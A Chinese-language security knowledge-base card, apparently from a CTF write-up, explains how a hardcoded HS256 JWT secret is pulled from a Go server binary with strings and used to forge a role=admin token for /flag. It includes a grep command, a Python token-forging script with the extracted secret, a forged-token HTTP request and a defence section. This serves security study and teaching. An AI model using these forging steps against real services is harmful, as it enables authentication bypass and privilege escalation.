---
id: web-generic-jwt-go-binary-hardcoded-secret-admin-forgery
title: 从 Go 服务端二进制提取硬编码 HS256 密钥，伪造 role=admin 的 JWT
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-hardcoded-secret-binary
tags:
- jwt
- hs256
- go
- binary
- hardcoded-secret
- auth-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:31:24+08:00'
  notes: 已对照原文与图08-11核对：附件为 Linux amd64 Go 服务端二进制、提示 HS256 角色校验、strings 得 secret_key=rMw_2026_litctf_jwt_secret_key!!、注册用户 JWT payload 为 role=user/iss=reverseMyWeb/sub=sun/exp/iat、jwt.io 改 role=admin 用该 secret 签名后访问 /flag 成功，均与卡片一致（卡内 PoC 的 sub 用 attacker 而非原文 sun，属示例值，不影响签名伪造）。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
url: /docs/web/generic/jwt/web-generic-jwt-go-binary-hardcoded-secret-admin-forgery/
draft: false
kb_aliases:
- Go 二进制 JWT 密钥
- strings 提取 secret_key
- HS256 密钥硬编码
- JWT 角色伪造
- reverseMyWeb
---

## 一句话结论

Go 服务端二进制常以明文字符串保留 JWT 签名密钥；攻击者拿到服务端程序后用 `strings`/逆向工具提取 `secret_key`，再按正常用户的 claims 结构把 `role` 改成 `admin` 重新做 HS256 签名，即可伪造管理员令牌访问 `/flag` 等受限接口。

## 原理

- HS256 是共享密钥 HMAC：签发与校验使用同一密钥。掌握密钥即可对任意 header/payload 生成服务端认可的签名。
- Go 二进制默认保留大量字符串常量、函数名与结构体字段名；硬编码在源码中的 `secret_key = "..."` 会以明文字符串形式留在 `.rodata` 中。
- 应用把角色写入 JWT claims（如 `role:"user"`），服务端只校验签名与 claims，不校验签发来源，因此把 `role` 改为 `admin` 并用同一密钥签名即可提权。
- 先注册普通账号拿到合法 JWT，可确定 `alg`、`iss`、`sub`、`exp`、`iat` 等字段名与格式，避免伪造时因 claims 缺失被拒。

## 触发条件

- 目标为 Go 服务端，签名密钥硬编码在二进制或随附件分发，且未剥离字符串/符号。
- 鉴权使用 HS256/HS384/HS512，JWT 中包含角色字段并由服务端直接信任。
- 攻击者可获得服务端二进制（题目附件、泄露的发布包、镜像层等）。

## 利用步骤

1. 对附件二进制执行 `strings server | grep -iE "secret|jwt|key"`，或放入 Ghidra/IDA 搜索 JWT 相关函数与字符串。
2. 提取候选密钥（本例为 `rMw_2026_litctf_jwt_secret_key!!`），并记录 `iss`、claims 字段。
3. 注册普通账号并登录，抓取返回的 JWT，在 jwt.io 或本地解码确认 payload 结构。
4. 用提取到的密钥、保持 `iss`/`sub`/时间字段格式，把 `role` 改为 `admin` 重新签名。
5. 携带伪造 JWT 访问 `/flag` 或管理接口，返回 200 与 flag 即成功。

## PoC

```bash
strings server | grep -iE "secret|jwt"
# secret_key=rMw_2026_litctf_jwt_secret_key!!
```

```python
import jwt, time
secret = "rMw_2026_litctf_jwt_secret_key!!"
payload = {
    "role": "admin",
    "iss": "reverseMyWeb",
    "sub": "attacker",
    "exp": int(time.time()) + 86400,
    "iat": int(time.time()),
}
print(jwt.encode(payload, secret, algorithm="HS256"))
```

```http
GET /flag HTTP/1.1
Host: target
Authorization: Bearer <伪造的 admin token>
```

## 变体与关联

- 二进制未保留明文字符串时，可用 GoReSym/pclntab 恢复函数名，动态调试定位签发点，或从内存 dump 中搜密钥。
- 若应用同时支持 Cookie 携带 token，可改用 `Cookie: token=<token>`。
- 关联：[[web-generic-jwt-example-config-hardcoded-secret]]（配置/示例文件中的硬编码密钥）、[[web-generic-jwt-weak-hmac-key-bruteforce]]（密钥未知时的字典爆破）、[[ctf-web-go-server-local-replay-admin-jwt]]（同一挑战的本地复现签发路线）。

## 检测与防御

- 不在发布二进制中硬编码 JWT 密钥；使用 KMS/环境变量注入每环境独立高熵密钥并定期轮换。
- 服务端按 `sub` 查数据库当前角色，不直接信任 token 中的 `role`；增加签发者/受众校验。
- 发布前剥离符号与调试字符串；检测同一 `iss` 下 `sub` 陌生且 `role=admin` 的 token。
